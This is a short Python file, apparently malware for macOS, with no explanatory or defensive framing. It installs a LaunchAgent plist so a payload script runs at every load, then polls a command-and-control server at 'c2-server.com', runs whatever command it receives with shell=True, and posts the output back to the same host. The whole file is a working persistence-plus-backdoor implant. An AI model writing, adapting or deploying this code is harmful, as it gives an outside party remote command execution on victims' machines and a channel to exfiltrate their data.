# macos_payload.py
import os
import subprocess
import requests
import time

def setup_persistence():
    # Setup LaunchAgent
    with open("/Library/LaunchAgents/com.zero.click.plist", "w") as f:
        f.write("""
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.zero.click</string>
            <key>ProgramArguments</key>
            <array>
                <string>/usr/bin/python3</string>
                <string>/Library/Application Support/payload.py</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """)
    os.system("launchctl load /Library/LaunchAgents/com.zero.click.plist")

def setup_c2():
    # Setup C2 channel
    while True:
        try:
            resp = requests.get("https://c2-server.com/cmd")
            if resp.status_code == 200:
                cmd = resp.json()["cmd"]
                output = subprocess.check_output(cmd, shell=True)
                requests.post("https://c2-server.com/output", 
                             json={"output": output.decode()})
        except:
            time.sleep(5)

setup_persistence()
setup_c2()